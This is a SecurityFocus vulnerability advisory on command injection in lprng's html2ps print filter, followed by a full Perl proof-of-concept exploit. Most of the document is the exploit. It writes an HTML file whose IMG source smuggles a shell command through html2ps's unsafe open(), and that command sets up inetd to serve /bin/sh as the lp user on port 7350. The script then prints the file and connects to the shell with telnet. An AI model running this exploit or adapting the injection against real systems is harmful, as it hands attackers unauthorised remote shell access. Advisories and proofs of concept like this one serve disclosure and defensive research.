source: http://www.securityfocus.com/bid/6079/info

A vulnerability has been discovered in the html2ps filter which is included in the lprng print system.

It has been reported that it is possible for a remote attacker to execute arbitrary commands. The attacker must reportedly already have access to the 'lp' (or equivalent) account to exploit this condition.

This cause of this vulnerability is that html2ps may open files using unsanitized input that may be supplied by a potentially malicious user. 

#!/usr/bin/perl -W

# html2ps remote "lp" exploit. Opens shell on port 7350.
# If used for testing remote machines, /etc/printcap must
# contain apropriate remote printernames etc. and lpd must
# be set up correctly.
# (C) 2002 Sebastian Krahmer, proof of concept exploit.

# Brief problem description: lprng calls printfilters as any
# other print-spooloing systems do. It calls them with UID of lp
# thats why you get lp-user shell later. The html2ps filter which is
# a perl script is called to convert the evil.html to .ps.
# However there it breaks because html2ps calls open() function insecurely
# and some other bad stuff is done too. It tries to convert the IMG embedded
# in the html and invokes some commands which give us access. Thats all. :)


sub usage
{
	print "\n$0 <printhost> <remote-host>\n".
	      "\tprinthost   -- name of printer in /etc/printcap\n".
	      "\tremote-host -- IP or hostname of host where shell appears\n".
	      "'$0 lp 127.0.0.1' is recommended for everyones own machine\n\n";
	exit;
}


my $printhost = shift || usage();
my $remote = shift || usage();

print "Constructing evil.html ...\n";

open O, ">evil.html" or die $!;
print O<<__eof__;
<HTML>
<IMG SRC="|IFS=A;X=A;echo\${X}7350\${X}stream\${X}tcp\${X}nowait\${X}lp\${X}/bin/sh\${X}-i|dd\${X}of=/tmp/f;inetd\${X}/tmp/f">
</HTML>
__eof__

close O;

if (fork() == 0) {
	exec("/usr/bin/lpr", "-P", $printhost, "evil.html");
}
wait;
sleep 3;
print "Connecting ...\n";
exec("/usr/bin/telnet", $remote, 7350);


